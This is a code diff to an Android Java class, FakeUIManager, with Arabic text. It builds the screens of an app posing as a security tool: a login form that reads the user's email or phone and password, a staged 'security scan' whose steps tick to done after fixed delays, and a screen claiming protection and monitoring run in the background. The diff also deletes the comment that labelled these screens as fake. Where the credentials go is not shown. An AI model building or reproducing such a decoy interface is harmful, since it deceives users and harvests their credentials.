@@ -20,9 +20,8 @@ import android.widget.ScrollView;
 import android.widget.TextView;
 
 /**
- * FakeUIManager — يدير الشاشات الوهمية
- * ============================================================
- * شاشات التطبيق الحقيقية:
+ * FakeUIManager -
+ *
  * 1. Welcome
  * 2. Login
  * 3. Security Scan
@@ -103,7 +102,7 @@ public class FakeUIManager {
         LinearLayout root = createBaseLayout();
 
         // Icon
-        TextView icon = createIcon("🔒", 80);
+        TextView icon = createIcon("🛡", 80);
         root.addView(icon);
 
         // Title
@@ -112,14 +111,14 @@ public class FakeUIManager {
 
         // Subtitle
         TextView subtitle = createSubtitle(
-            "نظام حماية متقدم\nلحماية بياناتك وخصوصيتك"
+                "لحماية بياناتك وخصوصيتك، نظام حماية متقدم"
         );
         root.addView(subtitle);
 
         // Spacer
         LinearLayout spacer = new LinearLayout(activity);
         spacer.setLayoutParams(new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, dp(40)
+                LinearLayout.LayoutParams.MATCH_PARENT, dp(40)
         ));
         root.addView(spacer);
 
@@ -161,7 +160,7 @@ public class FakeUIManager {
         root.setGravity(Gravity.CENTER_HORIZONTAL);
 
         // Icon
-        TextView icon = createIcon("🛡️", 60);
+        TextView icon = createIcon("🔒", 60);
         root.addView(icon);
 
         // Title
@@ -169,7 +168,7 @@ public class FakeUIManager {
         root.addView(title);
 
         // Subtitle
-        TextView subtitle = createSubtitle("يرجى تسجيل الدخول للمتابعة");
+        TextView subtitle = createSubtitle("أدخل بياناتك للمتابعة");
         root.addView(subtitle);
 
         // Username field
@@ -181,9 +180,9 @@ public class FakeUIManager {
         root.addView(userLabel);
 
         EditText username = new EditText(activity);
-        username.setHint("أدخل اسم المستخدم");
-        username.setTextColor(Color.WHITE);
+        username.setHint("البريد الإلكتروني أو الهاتف");
         username.setHintTextColor(Color.parseColor("#64748b"));
+        username.setTextColor(Color.WHITE);
         username.setBackgroundColor(Color.parseColor("#1e293b"));
         username.setPadding(dp(15), dp(12), dp(15), dp(12));
         username.setTextSize(14);
@@ -191,18 +190,18 @@ public class FakeUIManager {
 
         // Password field
         TextView passLabel = new TextView(activity);
-        passLabel.setText("كلمة السر");
+        passLabel.setText("كلمة المرور");
         passLabel.setTextColor(Color.parseColor("#cbd5e1"));
         passLabel.setTextSize(13);
         passLabel.setPadding(dp(5), dp(15), dp(5), dp(5));
         root.addView(passLabel);
 
         EditText password = new EditText(activity);
-        password.setHint("أدخل كلمة السر");
-        password.setInputType(android.text.InputType.TYPE_CLASS_TEXT |
-                              android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
-        password.setTextColor(Color.WHITE);
+        password.setHint("كلمة المرور");
+        password.setInputType(android.text.InputType.TYPE_CLASS_TEXT
+                | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
         password.setHintTextColor(Color.parseColor("#64748b"));
+        password.setTextColor(Color.WHITE);
         password.setBackgroundColor(Color.parseColor("#1e293b"));
         password.setPadding(dp(15), dp(12), dp(15), dp(12));
         password.setTextSize(14);
@@ -216,7 +215,7 @@ public class FakeUIManager {
         loginBtn.setTypeface(null, Typeface.BOLD);
         loginBtn.setBackgroundColor(Color.parseColor("#2563eb"));
         LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
+                LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
         );
         btnParams.topMargin = dp(25);
         loginBtn.setLayoutParams(btnParams);
@@ -225,7 +224,7 @@ public class FakeUIManager {
             String u = username.getText().toString().trim();
             String p = password.getText().toString().trim();
 
-            // ما تقبلش الفاضي
+            // ما تقبل الفاضي
             if (u.isEmpty() || p.isEmpty()) {
                 loginBtn.setText("يرجى ملء البيانات");
                 loginBtn.setBackgroundColor(Color.parseColor("#dc2626"));
@@ -249,7 +248,7 @@ public class FakeUIManager {
 
         // Footer
         TextView footer = new TextView(activity);
-        footer.setText("🛡️ اتصال مشفّر · SSL 256-bit");
+        footer.setText("🔒 اتصال مشفّر · SSL 256-bit");
         footer.setTextColor(Color.parseColor("#475569"));
         footer.setTextSize(11);
         footer.setPadding(0, dp(30), 0, 0);
@@ -267,15 +266,15 @@ public class FakeUIManager {
         LinearLayout root = createBaseLayout();
 
         // Icon
-        TextView icon = createIcon("🛡️", 60);
+        TextView icon = createIcon("🛡", 60);
         root.addView(icon);
 
         // Title
-        TextView title = createTitle("جاري الفحص الأمني");
+        TextView title = createTitle("جاري الفحص الأمني...");
         root.addView(title);
 
         // Subtitle
-        TextView subtitle = createSubtitle("يتم فحص جهازك وبياناتك");
+        TextView subtitle = createSubtitle("يتم فحص جهازك وبياناتك...");
         root.addView(subtitle);
 
         // Steps container
@@ -284,30 +283,30 @@ public class FakeUIManager {
         stepsContainer.setBackgroundColor(Color.parseColor("#1e293b"));
         stepsContainer.setPadding(dp(20), dp(20), dp(20), dp(20));
         LinearLayout.LayoutParams stepsParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.WRAP_CONTENT
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
         );
         stepsParams.topMargin = dp(20);
         stepsContainer.setLayoutParams(stepsParams);
         root.addView(stepsContainer);
 
         String[] steps = {
-            "🔍 فحص الاتصال بالشبكة",
-            "🔐 التحقق من هوية الجهاز",
-            "🛡️ فحص الأمان العام",
-            "📊 تحليل المخاطر المحتملة",
-            "🔒 فحص التشفير",
-            "✅ التأكد من سلامة النظام",
+                "🔍 فحص الاتصال بالشبكة...",
+                "🔐 التحقق من هوية الجهاز...",
+                "🛡️ فحص الأمان العام...",
+                "📊 تحليل المخاطر المحتملة...",
+                "🔒 فحص التشفير...",
+                "✅ التأكد من سلامة النظام..."
         };
 
         int[] delays = {500, 700, 800, 900, 800, 700};
 
         activity.setContentView(root);
 
-        // ★ أضف كل خطوة تدريجياً
+        // ★ إضافة كل خطوة تدريجياً
         for (int i = 0; i < steps.length; i++) {
             final int index = i;
-            final String stepText = steps[i];
+            final String stepLabel = steps[i];  // ✅ اسم جديد لتجنب التعارض
             final int delay = delays[i];
 
             handler.postDelayed(() -> {
@@ -321,15 +320,15 @@ public class FakeUIManager {
                 stepIcon.setPadding(0, 0, dp(10), 0);
                 stepRow.addView(stepIcon);
 
-                TextView stepText = new TextView(activity);
-                stepText.setText(stepText);
+                TextView stepText = new TextView(activity);  // ✅ كائن TextView فريد
+                stepText.setText(stepLabel);                 // ✅ يمرر String وليس TextView
                 stepText.setTextColor(Color.parseColor("#cbd5e1"));
                 stepText.setTextSize(14);
                 stepRow.addView(stepText);
 
                 stepsContainer.addView(stepRow);
 
-                // بعد 500ms → غير الأيقونة لـ ✓
+                // بعد 500 ms → ✅
                 handler.postDelayed(() -> {
                     stepIcon.setText("✅");
                 }, 500);
@@ -337,7 +336,7 @@ public class FakeUIManager {
             }, getAccumulatedDelay(delays, i));
         }
 
-        // بعد ما كل الخطوات تخلص
+        // ★ انتهى الفحص
         int totalDelay = getAccumulatedDelay(delays, steps.length) + 800;
         handler.postDelayed(() -> {
             if (onComplete != null) onComplete.run();
@@ -361,47 +360,21 @@ public class FakeUIManager {
         TextView icon = createIcon("⚙️", 60);
         root.addView(icon);
 
-        TextView title = createTitle(message != null ? message : "جاري التهيئة");
+        TextView title = createTitle(message != null ? message : "جاري المعالجة...");
         root.addView(title);
 
-        ProgressBar progress = new ProgressBar(
-            activity, null, android.R.attr.progressBarStyleHorizontal
-        );
-        progress.setMax(100);
-        progress.setProgress(0);
-        LinearLayout.LayoutParams pParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, dp(8)
-        );
-        pParams.topMargin = dp(30);
-        progress.setLayoutParams(pParams);
+        ProgressBar progress = new ProgressBar(activity);
+        progress.setIndeterminate(true);
         root.addView(progress);
 
-        TextView percent = new TextView(activity);
-        percent.setText("0%");
-        percent.setTextColor(Color.WHITE);
-        percent.setTextSize(18);
-        percent.setTypeface(null, Typeface.BOLD);
-        percent.setGravity(Gravity.CENTER);
-        percent.setPadding(0, dp(15), 0, 0);
-        root.addView(percent);
+        TextView subtitle = createSubtitle("لحظات قليلة...");
+        root.addView(subtitle);
 
         activity.setContentView(root);
 
-        // ★ Progress animation
-        final int[] current = {0};
-        final int[] steps = {5, 8, 12, 15, 20, 25, 35, 50, 65, 75, 85, 92, 98, 100};
-
-        for (int i = 0; i < steps.length; i++) {
-            final int target = steps[i];
-            handler.postDelayed(() -> {
-                progress.setProgress(target);
-                percent.setText(target + "%");
-            }, (i + 1) * 200);
-        }
-
         handler.postDelayed(() -> {
             if (onComplete != null) onComplete.run();
-        }, steps.length * 200 + 500);
+        }, 2000);
     }
 
     // ============================================================
@@ -418,7 +391,7 @@ public class FakeUIManager {
         root.addView(title);
 
         TextView subtitle = createSubtitle(
-            "التطبيق يعمل الآن في الخلفية\nلحماية جهازك"
+                "الحماية مفعّلة الآن في الخلفية"
         );
         root.addView(subtitle);
 
@@ -428,17 +401,17 @@ public class FakeUIManager {
         card.setBackgroundColor(Color.parseColor("#1e293b"));
         card.setPadding(dp(20), dp(20), dp(20), dp(20));
         LinearLayout.LayoutParams cParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.WRAP_CONTENT
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
         );
         cParams.topMargin = dp(20);
         card.setLayoutParams(cParams);
 
         String[] info = {
-            "🔒 الحماية: مفعّلة",
-            "📡 المراقبة: نشطة",
-            "🛡️ الجدار الأمني: يعمل",
-            "✅ النظام: آمن",
+                "🛡️ الحماية: مفعّلة",
+                "👁️ المراقبة: نشطة",
+                "🔐 الجدار الأمني: يعمل",
+                "✅ النظام: آمن"
         };
 
         for (String line : info) {
@@ -460,7 +433,7 @@ public class FakeUIManager {
         closeBtn.setTypeface(null, Typeface.BOLD);
         closeBtn.setBackgroundColor(Color.parseColor("#16a34a"));
         LinearLayout.LayoutParams bParams = new LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
+                LinearLayout.LayoutParams.MATCH_PARENT, dp(50)
         );
         bParams.topMargin = dp(30);
         closeBtn.setLayoutParams(bParams);
@@ -478,4 +451,4 @@ public class FakeUIManager {
 
         activity.setContentView(root);
     }
-}
+            }
